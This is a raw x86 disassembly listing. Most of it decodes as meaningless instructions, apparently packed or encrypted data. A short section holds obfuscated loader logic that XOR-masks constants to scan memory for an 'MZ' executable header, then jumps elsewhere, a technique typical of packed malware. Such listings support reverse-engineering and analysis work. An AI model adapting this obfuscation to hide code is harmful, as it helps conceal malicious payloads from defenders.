  40c0dd:	out    0xf3,al
  40c0df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c0e0:	pop    ecx
  40c0e1:	ror    BYTE PTR [edi],cl
  40c0e3:	mov    dl,0x34
  40c0e5:	mov    DWORD PTR [esi+0x51],ebp
  40c0e8:	xor    BYTE PTR [ebx+0x63],0x32
  40c0ec:	inc    edi
  40c0ed:	fs ret 0xd5c2
  40c0f1:	cld    
  40c0f2:	pushf  
  40c0f3:	ficom  DWORD PTR [edi+ebp*2]
  40c0f6:	push   ds
  40c0f7:	in     al,dx
  40c0f8:	test   eax,0xaefdf2ff
  40c0fd:	movd   mm1,DWORD PTR [eax+ecx*4+0x7]
  40c102:	pop    ds
  40c103:	mov    ebx,fs
  40c105:	mov    ds:0xe66dcbac,al
  40c10a:	in     eax,dx
  40c10b:	cmp    DWORD PTR [ecx-0x5b095fbf],edx
  40c111:	ret    
  40c112:	and    eax,0x24ad2638
  40c117:	cmp    eax,0xcbcca864
  40c11c:	jae    0x40c17a
  40c11e:	push   eax
  40c11f:	test   DWORD PTR [ecx-0x34],esp
  40c122:	sar    BYTE PTR [edx+ebx*1+0x41f8e2ba],0x48
  40c12a:	popf   
  40c12b:	les    ebx,FWORD PTR [edx-0x376a0740]
  40c131:	xchg   DWORD PTR [edi+0x3],edx
  40c134:	fmul   QWORD PTR [ebx-0x6a68d654]
  40c13a:	inc    ecx
  40c13b:	iret   
  40c13c:	add    al,0x5b
  40c13e:	fisubr DWORD PTR [edx+0x3bf85a6]
  40c144:	jl     0x40c106
  40c146:	lods   al,BYTE PTR ds:[esi]
  40c147:	stos   BYTE PTR es:[edi],al
  40c148:	or     al,0xb6
  40c14a:	repz (bad) 
  40c14c:	inc    esi
  40c14d:	scas   eax,DWORD PTR es:[edi]
  40c14e:	lds    edx,FWORD PTR [ebp-0xa]
  40c151:	mov    al,0xdd
  40c153:	dec    eax
  40c154:	mov    bh,0xd2
  40c156:	lods   eax,DWORD PTR ds:[esi]
  40c157:	rcl    bl,cl
  40c159:	rcr    esp,1
  40c15b:	cmp    BYTE PTR [edi+ecx*1],bh
  40c15e:	das    
  40c15f:	or     DWORD PTR [ebx],edx
  40c161:	mov    ebp,0x885ab12d
  40c166:	pop    eax
  40c167:	inc    ebp
  40c168:	aaa    
  40c169:	mov    ecx,0xe77a76bc
  40c16e:	xor    eax,0x254aee26
  40c173:	mov    al,ds:0xf42261da
  40c178:	mov    dh,0x83
  40c17a:	in     al,0xb5
  40c17c:	inc    edx
  40c17d:	test   BYTE PTR [ecx-0x2f],0x37
  40c181:	(bad)  
  40c182:	lock xchg edi,eax
  40c184:	loop   0x40c1a9
  40c186:	and    al,BYTE PTR [ecx]
  40c188:	xchg   ebx,eax
  40c189:	jnp    0x40c179
  40c18b:	cmp    al,0x99
  40c18d:	and    eax,0xd99aea6d
  40c192:	jnp    0x40c16b
  40c194:	loop   0x40c19f
  40c196:	aas    
  40c197:	mov    WORD PTR [edi-0x5b8dff51],cs
  40c19d:	jb     0x40c17f
  40c19f:	test   BYTE PTR [ebx+0x14],al
  40c1a2:	pop    edi
  40c1a3:	inc    ebx
  40c1a4:	push   esp
  40c1a5:	dec    esp
  40c1a6:	into   
  40c1a7:	lds    eax,FWORD PTR fs:[esi-0x2c47c083]
  40c1ae:	jp     0x40c1c7
  40c1b0:	jnp    0x40c1cf
  40c1b2:	dec    ecx
  40c1b3:	mov    al,0xb
  40c1b5:	ss mov esi,0x1673e17f
  40c1bb:	ror    esp,cl
  40c1bd:	cli    
  40c1be:	shl    DWORD PTR [ecx-0x4c],cl
  40c1c1:	mov    bl,0x99
  40c1c3:	and    BYTE PTR [eax-0x611e7122],0xcd
  40c1ca:	scas   al,BYTE PTR es:[edi]
  40c1cb:	retf   
  40c1cc:	cmp    DWORD PTR [ebp*1-0x21a7147f],0xffffffc0
  40c1d4:	cmp    esi,ecx
  40c1d6:	fsub   QWORD PTR [ecx-0x20795625]
  40c1dc:	dec    ebp
  40c1dd:	repnz fs jecxz 0x40c164
  40c1e1:	add    eax,0xe70749af
  40c1e6:	cs aaa 
  40c1e8:	cdq    
  40c1e9:	imul   esp,ebx,0x4e
  40c1ec:	adc    bh,dh
  40c1ee:	push   esp
  40c1ef:	cmc    
  40c1f0:	push   edx
  40c1f1:	nop
  40c1f2:	retf   0x3726
  40c1f5:	dec    esp
  40c1f6:	(bad)  
  40c1f7:	push   ecx
  40c1f8:	enter  0xfe44,0x1c
  40c1fc:	aaa    
  40c1fd:	nop
  40c1fe:	jmp    0x40c1c9
  40c200:	ror    esp,0x6b
  40c203:	mov    dl,0x8f
  40c205:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c206:	adc    al,0x9f
  40c208:	call   0xb10e:0x462891c2
  40c20f:	cwde   
  40c210:	sbb    cl,BYTE PTR [ecx-0x7f]
  40c213:	mov    al,0x44
  40c215:	test   eax,0x141060ec
  40c21a:	out    dx,eax
  40c21b:	push   0x721201fd
  40c220:	jno    0x40c1a8
  40c222:	mov    edi,0x9c586235
  40c227:	sti    
  40c228:	dec    ebp
  40c229:	(bad)  
  40c22a:	lods   al,BYTE PTR ds:[esi]
  40c22b:	data16 adc al,0xb9
  40c22e:	xchg   edi,eax
  40c22f:	pop    ebp
  40c230:	push   esp
  40c231:	rcl    BYTE PTR [eax],1
  40c233:	pop    edi
  40c234:	sar    BYTE PTR [eax+ebp*2+0x3499ebde],1
  40c23b:	(bad)  
  40c23c:	xor    eax,0xaa4566a4
  40c241:	push   edx
  40c242:	aaa    
  40c243:	mov    dl,0x43
  40c245:	inc    ecx
  40c246:	sbb    BYTE PTR [ecx-0x22ceff78],0x92
  40c24d:	retf   0x5772
  40c250:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c251:	mov    esp,0xa3f8b5c9
  40c256:	out    0xa6,al
  40c258:	(bad)  
  40c259:	ins    BYTE PTR es:[edi],dx
  40c25a:	cdq    
  40c25b:	dec    ecx
  40c25c:	pushf  
  40c25d:	(bad)  
  40c25f:	add    eax,0x527eff67
  40c264:	inc    edx
  40c265:	in     eax,dx
  40c266:	call   0x222d:0xc293d9ab
  40c26d:	mov    cl,0xa4
  40c26f:	xchg   edi,eax
  40c270:	pop    ebp
  40c271:	mov    edx,0x2a3afae8
  40c276:	int    0xbc
  40c278:	xor    BYTE PTR [eax+0xa4b58b8],al
  40c27e:	add    al,0x27
  40c280:	stos   BYTE PTR es:[edi],al
  40c281:	std    
  40c282:	(bad)  
  40c283:	jecxz  0x40c302
  40c285:	aas    
  40c286:	mov    dl,0x8b
  40c288:	jnp    0x40c261
  40c28a:	test   al,0xf8
  40c28c:	push   ebp
  40c28d:	adc    ah,dl
  40c28f:	inc    esi
  40c290:	enter  0x6e20,0x14
  40c294:	xor    DWORD PTR [ebx+0x30],ebp
  40c297:	push   ebx
  40c298:	mov    fs,eax
  40c29a:	or     DWORD PTR [edi],ecx
  40c29c:	push   es
  40c29d:	pop    ebx
  40c29e:	mov    ds:0x44d731b2,al
  40c2a3:	push   edx
  40c2a4:	adc    dl,ah
  40c2a6:	or     al,0x49
  40c2a8:	data16 into 
  40c2aa:	inc    eax
  40c2ab:	mov    DWORD PTR [eax+0x50ba5d21],esp
  40c2b1:	dec    ebp
  40c2b2:	cmp    DWORD PTR [edi+0x6b],edx
  40c2b5:	gs loop 0x40c279
  40c2b8:	jge    0x40c2ff
  40c2ba:	pop    edi
  40c2bb:	es dec edx
  40c2bd:	ss aas 
  40c2bf:	hlt    
  40c2c0:	add    eax,0x598e3927
  40c2c5:	lods   al,BYTE PTR ds:[esi]
  40c2c6:	aam    0xa3
  40c2c8:	js     0x40c267
  40c2ca:	and    esi,DWORD PTR [ebx+0x397fc8e]
  40c2d0:	(bad)  
  40c2d1:	mov    al,ds:0xb63e2d6b
  40c2d6:	sti    
  40c2d7:	mov    al,ds:0x48dd641
  40c2dc:	std    
  40c2dd:	or     al,0x19
  40c2df:	mov    ebx,0xbd50e877
  40c2e4:	push   esi
  40c2e5:	icebp  
  40c2e6:	push   es
  40c2e7:	inc    ebp
  40c2e8:	add    cl,BYTE PTR [ebx]
  40c2ea:	repnz adc DWORD PTR [edi-0x4e],edi
  40c2ee:	mov    dl,0xd8
  40c2f0:	vaddss xmm0,xmm7,DWORD PTR [edi+esi*8+0x59]
  40c2f6:	sbb    eax,0x4b79556
  40c2fb:	xlat   BYTE PTR ds:[ebx]
  40c2fc:	cmp    DWORD PTR [edi-0x7010e84c],edx
  40c302:	cmp    al,0x34
  40c304:	or     dl,bl
  40c306:	(bad)  
  40c307:	in     eax,0x37
  40c309:	jns    0x40c358
  40c30b:	std    
  40c30c:	inc    ecx
  40c30d:	inc    edi
  40c30e:	sbb    al,0xb3
  40c310:	inc    ecx
  40c311:	mov    edx,DWORD PTR [ebp+esi*1+0x47]
  40c315:	xchg   edi,eax
  40c316:	mov    ds:0x2ebf4039,al
  40c31b:	dec    ebx
  40c31c:	pushf  
  40c31d:	sub    al,0x9
  40c31f:	mov    ebx,0x20b1a810
  40c324:	int3   
  40c325:	mov    al,ds:0xbc189f7a
  40c32a:	cmp    DWORD PTR [edx],esi
  40c32c:	inc    eax
  40c32d:	jmp    0x3927:0xc15a2086
  40c334:	cld    
  40c335:	add    al,0x86
  40c337:	adc    dh,BYTE PTR ds:0xf4ec2e15
  40c33d:	jae    0x40c351
  40c33f:	sub    eax,0xa379b0dc
  40c344:	in     al,dx
  40c345:	addr16 mov edi,0x6310436
  40c34b:	pushf  
  40c34c:	or     eax,DWORD PTR [eax]
  40c34e:	ret    0x6ec3
  40c351:	fistp  DWORD PTR [edx+0x55]
  40c354:	mov    ebp,0xd7106c5b
  40c359:	jg     0x40c3bd
  40c35b:	addr16 or edi,ebp
  40c35e:	adc    DWORD PTR [eax-0x73],edx
  40c361:	mov    dh,0x98
  40c363:	pop    eax
  40c364:	sbb    DWORD PTR [esi],edx
  40c366:	jp     0x40c3e1
  40c368:	imul   DWORD PTR [esi-0x2cce58d0]
  40c36e:	sub    esp,ebp
  40c370:	or     ecx,esp
  40c372:	ds mov ?,ebx
  40c375:	xchg   esi,eax
  40c376:	scas   eax,DWORD PTR es:[edi]
  40c377:	shl    DWORD PTR [esi-0x6b],1
  40c37a:	sub    eax,0xf2b158b6
  40c37f:	(bad)  
  40c380:	cmp    bh,dh
  40c382:	jno    0x40c31b
  40c384:	sub    esp,esi
  40c386:	inc    esi
  40c387:	pushf  
  40c388:	pop    ss
  40c389:	mov    ebx,0xd3db6731
  40c38e:	daa    
  40c38f:	add    BYTE PTR [edi+edx*1-0x76b62083],ah
  40c396:	(bad)  
  40c397:	repnz mov edx,0x940580c6
  40c39d:	or     al,0x98
  40c39f:	add    BYTE PTR [ebx-0x3fe05d1],al
  40c3a5:	push   es
  40c3a6:	test   al,0x67
  40c3a8:	xchg   esp,eax
  40c3a9:	mov    ebp,DWORD PTR [esi+0x13]
  40c3ac:	mov    esp,esp
  40c3ae:	pop    ebx
  40c3af:	loopne 0x40c354
  40c3b1:	test   BYTE PTR [edi+0x5],ah
  40c3b4:	add    BYTE PTR ds:0xeb28db64,dl
  40c3ba:	cmp    DWORD PTR [eax+0x10],0xffffff93
  40c3be:	inc    edx
  40c3bf:	das    
  40c3c0:	mov    bh,0xd8
  40c3c2:	pop    ds
  40c3c3:	mov    dh,0xb9
  40c3c5:	or     ch,BYTE PTR [ecx+edx*4+0x35]
  40c3c9:	xor    al,BYTE PTR [edx+0x4a642c9]
  40c3cf:	dec    edx
  40c3d0:	les    ebp,FWORD PTR [ebp-0x560248dc]
  40c3d6:	sahf   
  40c3d7:	aaa    
  40c3d8:	xchg   DWORD PTR [ecx+0x1b],edx
  40c3db:	retf   
  40c3dc:	add    DWORD PTR [eax+0x6c],ebp
  40c3df:	mov    dl,0xb3
  40c3e1:	adc    al,0xfc
  40c3e3:	sahf   
  40c3e4:	cmp    esi,DWORD PTR ds:0xc025b990
  40c3ea:	push   edx
  40c3eb:	imul   edi,esp,0x6c013d0d
  40c3f1:	xor    al,0x26
  40c3f3:	bound  esi,QWORD PTR [ebx]
  40c3f5:	xchg   ecx,eax
  40c3f6:	dec    esp
  40c3f7:	mov    bl,0x71
  40c3f9:	popa   
  40c3fa:	mov    al,0x3a
  40c3fc:	int    0x91
  40c3fe:	cli    
  40c3ff:	and    eax,0x6dac1e7f
  40c404:	jecxz  0x40c407
  40c406:	jne    0x40c392
  40c408:	xlat   BYTE PTR ds:[ebx]
  40c409:	inc    esp
  40c40a:	pusha  
  40c40b:	clc    
  40c40c:	mov    bl,0x4e
  40c40e:	mov    dh,0xc6
  40c410:	leave  
  40c411:	(bad)  
  40c412:	leave  
  40c413:	or     al,0xed
  40c415:	imul   edi,ebx,0xed83cc7d
  40c41b:	jmp    0x12a29bee
  40c420:	inc    ebx
  40c421:	cwde   
  40c422:	test   eax,0x897cf3c8
  40c427:	cli    
  40c428:	mov    ah,0x36
  40c42a:	mov    esi,0x9c507d91
  40c42f:	int    0x73
  40c431:	pop    esp
  40c432:	outs   dx,BYTE PTR ds:[esi]
  40c433:	xchg   esi,eax
  40c434:	push   cs
  40c435:	mov    eax,ds:0x753dc129
  40c43a:	xor    esp,DWORD PTR [esi]
  40c43c:	ror    BYTE PTR [eax],cl
  40c43e:	xchg   esi,eax
  40c43f:	and    BYTE PTR [ecx],cl
  40c441:	hlt    
  40c442:	mov    dl,0x89
  40c444:	out    0xbe,al
  40c446:	mov    cl,0xc0
  40c448:	pop    edx
  40c449:	(bad)  
  40c44a:	sar    ebp,cl
  40c44c:	outs   dx,DWORD PTR ds:[esi]
  40c44d:	leave  
  40c44e:	aaa    
  40c44f:	inc    edx
  40c450:	dec    esi
  40c451:	and    esp,DWORD PTR [ebx-0x68]
  40c454:	rol    BYTE PTR [ebp+0x26557483],cl
  40c45a:	sub    edi,esp
  40c45c:	mov    al,0xa2
  40c45e:	mov    eax,ds:0xbaa9e5ae
  40c463:	imul   DWORD PTR [edi+0x355e2feb]
  40c469:	dec    esi
  40c46b:	mov    edx,0xa5846e
  40c470:	cmp    DWORD PTR [eax+0x24],esp
  40c473:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c474:	jnp    0x40c451
  40c476:	push   ebx
  40c477:	in     eax,dx
  40c478:	cmp    eax,0xc3fd8b73
  40c47d:	sti    
  40c47e:	inc    ecx
  40c47f:	pop    edx
  40c480:	enter  0x2a99,0x57
  40c484:	in     al,0x93
  40c486:	add    DWORD PTR [ebp+edx*4+0x1f8031e],esi
  40c48d:	push   ds
  40c48e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c48f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c490:	test   cl,dl
  40c492:	jg     0x40c415
  40c494:	std    
  40c495:	std    
  40c496:	mov    eax,ds:0xf66c04a6
  40c49b:	sbb    ecx,DWORD PTR ss:[edi-0x60c6deee]
  40c4a2:	sbb    edx,DWORD PTR [ebp-0x6ee4ce0a]
  40c4a8:	repz aad 0x7f
  40c4ab:	inc    eax
  40c4ac:	and    eax,0x4420219c
  40c4b1:	retf   
  40c4b2:	mul    DWORD PTR [ecx+0x58fa2421]
  40c4b8:	mov    dh,0xcb
  40c4ba:	pop    edi
  40c4bb:	jnp    0x40c4de
  40c4bd:	popa   
  40c4be:	jp     0x40c454
  40c4c0:	aam    0x38
  40c4c2:	inc    eax
  40c4c3:	cmp    BYTE PTR [edx],ch
  40c4c5:	bound  eax,QWORD PTR [ebx-0x77]
  40c4c8:	jno    0x40c522
  40c4ca:	fcom   st(2)
  40c4cc:	leave  
  40c4cd:	xchg   al,bh
  40c4cf:	cmp    eax,0x463941ed
  40c4d4:	sar    DWORD PTR [ecx+edi*4],1
  40c4d7:	push   ebp
  40c4d8:	mov    dh,0x87
  40c4da:	jge    0x40c47b
  40c4dc:	aam    0x42
  40c4de:	add    DWORD PTR [ebp-0x70b0682c],0xdaa4fe9e
  40c4e8:	rcl    DWORD PTR [ecx+edx*4+0x6ca53382],1
  40c4ef:	dec    edi
  40c4f0:	pop    edx
  40c4f1:	outs   dx,BYTE PTR ds:[esi]
  40c4f2:	add    BYTE PTR [eax+0x79],bh
  40c4f5:	mov    ebp,DWORD PTR [eax]
  40c4f7:	xor    DWORD PTR [eax],ebp
  40c4f9:	mov    esp,0x5aa503bf
  40c4fe:	pop    ebp
  40c4ff:	je     0x40c508
  40c501:	loopne 0x40c548
  40c503:	inc    esi
  40c504:	ds gs push ds
  40c507:	sbb    BYTE PTR [esi],bh
  40c509:	jp     0x40c4f6
  40c50b:	test   DWORD PTR [esi+0x5f670272],ebx
  40c511:	ins    DWORD PTR es:[edi],dx
  40c512:	test   al,0x88
  40c514:	inc    ecx
  40c515:	aam    0xd7
  40c517:	inc    ebp
  40c518:	cld    
  40c519:	push   ebx
  40c51a:	push   cs
  40c51b:	call   0x5695513b
  40c520:	xor    al,0x4a
  40c522:	push   DWORD PTR [ecx]
  40c524:	ja     0x40c4c6
  40c526:	imul   eax,DWORD PTR [ebp+0x4b2b5764]
  40c52d:	cmovnp esi,edi
  40c530:	push   ds
  40c531:	fdivp  st(1),st
  40c533:	add    BYTE PTR es:[ebp+0x4d],bh
  40c537:	add    eax,0x3120cc1
  40c53c:	push   edi
  40c53d:	or     al,0x3b
  40c53f:	arpl   WORD PTR [edi-0x17],cx
  40c542:	sub    al,0xed
  40c544:	jne    0x40c515
  40c546:	push   ds
  40c547:	xchg   edi,eax
  40c548:	xor    al,0x89
  40c54a:	out    0x2f,eax
  40c54c:	test   BYTE PTR [esi+edx*4+0x2df16371],bl
  40c553:	aas    
  40c554:	pop    eax
  40c555:	jnp    0x40c578
  40c557:	call   0x4176:0xd97e388c
  40c55e:	lods   eax,DWORD PTR ds:[esi]
  40c55f:	adc    eax,ebp
  40c561:	sub    BYTE PTR [edx-0x4b],ah
  40c564:	xchg   edx,eax
  40c565:	push   ecx
  40c566:	or     esi,DWORD PTR [ebp-0x7e0b8d4a]
  40c56c:	shl    DWORD PTR [esi-0x4d],1
  40c56f:	sub    edi,DWORD PTR [ebx-0x83efecd]
  40c575:	sub    BYTE PTR [esp+edx*1+0x28],cl
  40c579:	mov    dh,bh
  40c57b:	(bad)
  40c57e:	xchg   esp,eax
  40c57f:	jg     0x40c52b
  40c581:	jne    0x40c5e8
  40c583:	das    
  40c584:	mov    dh,BYTE PTR ds:0x25ab1e3f
  40c58a:	mov    edx,0x360323d
  40c58f:	cmp    BYTE PTR [ecx+0x458bf87d],cl
  40c595:	or     al,0x8b
  40c597:	jge    0x40c5a5
  40c599:	xor    edi,ecx
  40c59b:	xor    eax,ecx
  40c59d:	lea    eax,[eax+edi*1+0x64e5c4]
  40c5a4:	mov    edi,DWORD PTR [ebp+0xc]
  40c5a7:	xor    edi,ecx
  40c5a9:	add    edi,edx
  40c5ab:	imul   eax,edi
  40c5ae:	mov    edi,DWORD PTR [ebp+0xc]
  40c5b1:	xor    edi,ecx
  40c5b3:	sub    edi,eax
  40c5b5:	mov    eax,DWORD PTR [ebp-0x4]
  40c5b8:	add    edi,edx
  40c5ba:	cmp    DWORD PTR [eax],edi
  40c5bc:	mov    eax,DWORD PTR [ebp-0x4]
  40c5bf:	mov    edi,DWORD PTR [ebp+0x10]
  40c5c2:	jg     0x40c5d5
  40c5c8:	xor    edi,ecx
  40c5ca:	mov    ebx,esi
  40c5cc:	sub    ebx,edi
  40c5ce:	add    DWORD PTR [eax],ebx
  40c5d0:	jmp    0x40c5db
  40c5d5:	xor    edi,ecx
  40c5d7:	add    edi,edx
  40c5d9:	add    DWORD PTR [eax],edi
  40c5db:	mov    eax,DWORD PTR [ebp-0x8]
  40c5de:	mov    edi,DWORD PTR [ebp-0x10]
  40c5e1:	mov    eax,DWORD PTR [eax]
  40c5e3:	xor    edi,ecx
  40c5e5:	add    edi,0x3272e1
  40c5eb:	not    edi
  40c5ed:	and    eax,edi
  40c5ef:	movsx  di,BYTE PTR [eax+0x1]
  40c5f4:	mov    ebx,0x3b51
  40c5f9:	sub    di,bx
  40c5fc:	mov    ebx,0x8a8d
  40c601:	xor    di,bx
  40c604:	mov    ebx,0x4f84
  40c609:	cmp    di,bx
  40c60c:	jne    0x40c634
  40c612:	movsx  di,BYTE PTR [eax]
  40c616:	mov    ebx,0x3b51
  40c61b:	sub    di,bx
  40c61e:	mov    ebx,0x8a8d
  40c623:	xor    di,bx
  40c626:	mov    ebx,0x4e71
  40c62b:	cmp    di,bx
  40c62e:	je     0x40c644
  40c634:	mov    edi,DWORD PTR [ebp-0x10]
  40c637:	xor    edi,ecx
  40c639:	mov    ebx,esi
  40c63b:	sub    ebx,edi
  40c63d:	add    eax,ebx
  40c63f:	jmp    0x40c5ef
  40c644:	mov    esi,DWORD PTR [ebp-0x14]
  40c647:	mov    esi,DWORD PTR [esi]
  40c649:	jmp    0x40e998
  40c64e:	dec    edi
  40c64f:	sub    edi,esi
  40c651:	pusha  
  40c652:	repz inc edx
  40c654:	or     esi,ebx
  40c656:	test   eax,0x54b873c
  40c65b:	ja     0x40c6a4
  40c65d:	loop   0x40c601
  40c65f:	loopne 0x40c6dd
  40c661:	jl     0x40c6b1
  40c663:	pop    edi
  40c664:	jl     0x40c6e2
  40c666:	push   cs
  40c667:	fsubr  DWORD PTR [ebp-0x23]
  40c66a:	sbb    al,0x15
  40c66c:	fld    DWORD PTR [eax]
  40c66e:	jmp    0x40c650
  40c670:	push   ss
  40c671:	mov    ebp,0xb869c5e1
  40c676:	jnp    0x40c68e
  40c678:	or     eax,0x5dab79be
  40c67d:	push   ecx
  40c67e:	push   ecx
  40c67f:	sbb    al,0xca
  40c681:	nop
  40c682:	jmp    0x9ccc:0x3040d293
  40c689:	and    dl,BYTE PTR [eax]
  40c68b:	inc    ecx
  40c68c:	sar    BYTE PTR [eax-0x4a70bf10],0xd6
  40c693:	je     0x40c624
  40c695:	stc    
  40c696:	mov    BYTE PTR [ecx+0x259f6050],al
  40c69c:	(bad)  
  40c69e:	or     BYTE PTR gs:[ebx],bl
  40c6a1:	cmc    
  40c6a2:	and    eax,0x5baadb2e
  40c6a7:	lods   al,BYTE PTR ds:[esi]
  40c6a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c6a9:	hlt    
  40c6aa:	lods   al,BYTE PTR ds:[esi]
  40c6ab:	gs jo  0x40c637
  40c6ae:	jns    0x40c64e
  40c6b0:	ficom  DWORD PTR [esp+ebx*2+0x67]
  40c6b4:	adc    ch,bh
  40c6b6:	es cmp al,0x3e
  40c6b9:	mov    al,0xb9
  40c6bb:	bnd je 0x40c6fe
  40c6be:	ficomp DWORD PTR ds:0x44380906
  40c6c4:	(bad)  
  40c6c5:	aam    0xf8
  40c6c7:	mov    ds:0x5f79a372,al
  40c6cc:	push   ebp
  40c6cd:	pop    ebx
  40c6ce:	repz mov esi,edx
  40c6d1:	cmp    eax,0x1bbae46d
  40c6d6:	gs in  al,dx
  40c6d8:	mov    esp,DWORD PTR [ecx-0x29]
  40c6db:	pusha  
  40c6dc:	xchg   ebp,eax
  40c6dd:	push   ds
  40c6de:	rcl    edi,1
  40c6e0:	mov    al,0xed
  40c6e2:	out    dx,eax
  40c6e3:	loop   0x40c6d4
  40c6e5:	call   0xebdc:0x9d6bd156
  40c6ec:	mov    ds:0x970d50a3,al
  40c6f1:	and    BYTE PTR [edi-0x5a],bl
  40c6f4:	aad    0xca
  40c6f6:	cmp    bh,BYTE PTR [edx]
  40c6f8:	lods   eax,DWORD PTR ds:[esi]
  40c6f9:	pop    es
  40c6fa:	jmp    0x9a54:0x4d6e20a3
  40c701:	mov    dh,0xc1
  40c703:	(bad)  
  40c704:	mov    ebp,0xd24412a7
  40c709:	fnsave [ebx+0x78]
  40c70c:	fld    QWORD PTR [esi]
  40c70e:	dec    esp
  40c70f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c710:	add    BYTE PTR [ebp+0x79],ch
  40c713:	mov    bh,0x6
  40c715:	inc    edi
  40c716:	xchg   ebp,eax
  40c717:	or     ebp,DWORD PTR [esi]
  40c719:	adc    ebp,DWORD PTR [edx+edx*8+0x31]
  40c71d:	or     BYTE PTR [ecx],dh
  40c71f:	mov    WORD PTR [edx-0x5d],?
  40c722:	je     0x40c798
  40c724:	jb     0x40c729
  40c726:	dec    edi
  40c727:	fstp   st(5)
  40c729:	mov    dl,0xa8
  40c72b:	pop    es
  40c72c:	or     DWORD PTR [edx+ebp*4],ecx
  40c72f:	mov    bl,0xf1
  40c731:	xchg   esp,eax
  40c732:	and    edx,DWORD PTR [esi+ebx*1-0x3d582ad6]
  40c739:	mov    bl,0x86
  40c73b:	lods   eax,DWORD PTR ds:[esi]
  40c73c:	pop    eax
  40c73d:	xchg   ecx,eax
  40c73e:	push   ss
  40c73f:	add    BYTE PTR [eax],ch
  40c741:	adc    BYTE PTR [ebx-0x2425350b],bl
  40c747:	nop
  40c748:	fisubr DWORD PTR [ebp-0x51bd4154]
  40c74e:	enter  0x9030,0xb6
  40c752:	loopne 0x40c760
  40c754:	into   
  40c755:	and    DWORD PTR [edx],ecx
  40c757:	push   ss
  40c758:	push   ecx
  40c759:	sub    al,dl
  40c75b:	js     0x40c72f
  40c75d:	pop    ebp
  40c75e:	in     eax,0x2c
  40c760:	inc    esp
  40c761:	imul   esi,DWORD PTR [eax+0x71e09eb],0xaea8aee0
  40c76b:	mov    ?,WORD PTR [eax-0x6e9c1e4f]
  40c771:	neg    dh
  40c773:	popf   
  40c774:	pop    ds
  40c775:	ficomp DWORD PTR [edi]
  40c777:	mov    dh,0x0
  40c779:	sahf   
  40c77a:	inc    eax
  40c77b:	dec    ebx
  40c77c:	cdq    
  40c77d:	in     eax,dx
  40c77e:	sub    BYTE PTR [edi-0xa],al
  40c781:	push   ds
  40c782:	cmp    DWORD PTR [eax],ecx
  40c784:	retf   0x88ae
  40c787:	mov    dl,BYTE PTR [ebp+0x6b]
  40c78a:	cwde   
  40c78b:	pusha  
  40c78c:	lds    ecx,FWORD PTR ds:0xf30c3be0
  40c792:	(bad)  
  40c793:	xor    al,0x78
  40c795:	pop    esp
  40c796:	xor    dh,cl
  40c798:	loop   0x40c7cb
  40c79a:	and    al,0xb0
  40c79c:	adc    edi,ebx
  40c79e:	xlat   BYTE PTR ds:[ebx]
  40c79f:	(bad)  
  40c7a0:	jo     0x40c744
  40c7a2:	ret    0x8b31
  40c7a5:	mov    ebx,DWORD PTR [edi-0x4b0359ad]
  40c7ab:	or     al,0x7
  40c7ad:	sbb    DWORD PTR [eax-0x2b],eax
  40c7b0:	xlat   BYTE PTR ds:[ebx]
  40c7b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c7b2:	mov    bl,0xcf
  40c7b4:	mov    ?,ebp
  40c7b6:	xchg   ebp,eax
  40c7b7:	imul   esi,DWORD PTR [ecx],0xfffffffb
  40c7ba:	mov    edx,0x9232bcf
  40c7bf:	pop    edx
  40c7c0:	jbe    0x40c806
  40c7c2:	rol    DWORD PTR [ecx-0x446d1bbf],1
  40c7c8:	es dec esp
  40c7ca:	inc    edx
  40c7cb:	push   0xffffff9c
  40c7cd:	jne    0x40c777
  40c7cf:	push   es
  40c7d0:	sbb    ch,dh
  40c7d2:	retf   
  40c7d3:	test   BYTE PTR [ecx+0x70887edc],ch
  40c7d9:	xchg   ebp,edi
  40c7db:	outs   dx,BYTE PTR ds:[esi]
  40c7dc:	mov    al,ds:0x470575ef
  40c7e1:	mov    edx,0x7c85810f
  40c7e6:	pop    ss
  40c7e7:	xchg   DWORD PTR [edi],eax
  40c7e9:	add    eax,0x350933ab
  40c7ee:	and    edx,DWORD PTR [esi-0x384ef56a]
  40c7f4:	dec    ebp
  40c7f5:	mov    edx,eax
  40c7f7:	pop    ds
  40c7f8:	(bad)  
  40c7f9:	and    eax,0xa6764e15
  40c7fe:	sub    al,0x2c
  40c800:	test   DWORD PTR [ebx+0x2b6cf835],esp
  40c806:	mov    gs,WORD PTR ds:0xf053e097
  40c80c:	das    
  40c80d:	xchg   esi,eax
  40c80e:	imul   ebx,eax,0xffffffc7
  40c811:	enter  0xa785,0xf3
  40c815:	lock pop ss
  40c817:	jnp    0x40c814
  40c819:	pop    edx
  40c81a:	jle    0x40c88b
  40c81c:	jl     0x40c7af
  40c81e:	push   es
  40c81f:	push   es
  40c820:	ja     0x40c841
  40c822:	popf   
  40c823:	mov    dh,0x14
  40c825:	mov    ah,0xa0
  40c827:	inc    ecx
  40c828:	sbb    al,0x6e
  40c82a:	push   ebp
  40c82b:	int3   
  40c82c:	scas   al,BYTE PTR es:[edi]
  40c82d:	jns    0x40c7ee
  40c82f:	clc    
  40c830:	sbb    eax,0x29df4cd0
  40c835:	add    ah,ch
  40c837:	aad    0x32
  40c839:	in     al,dx
  40c83a:	or     al,0x3e
  40c83c:	xchg   esp,eax
  40c83d:	or     BYTE PTR [edi],bh
  40c83f:	inc    ecx
  40c840:	push   cs
  40c841:	xor    DWORD PTR [ebx],eax
  40c843:	sub    edi,DWORD PTR [edx-0x103a170a]
  40c849:	xor    DWORD PTR [edi+ecx*8-0x5db290b6],esi
  40c850:	mov    edi,0xb23602d5
  40c855:	or     BYTE PTR [ebp-0x4747239a],ch
  40c85b:	cmp    DWORD PTR [edx+ecx*4+0x4d],esp
  40c85f:	mov    BYTE PTR [edx+0x5ac5e3dd],0x19
  40c866:	out    dx,ax
  40c868:	xor    bl,0x61
  40c86b:	mov    BYTE PTR [ebp-0x45],dl
  40c86e:	pop    eax
  40c86f:	add    dh,BYTE PTR [ecx]
  40c871:	and    al,0xc7
  40c873:	cmp    BYTE PTR [edi-0x2e],ah
  40c876:	aam    0x6e
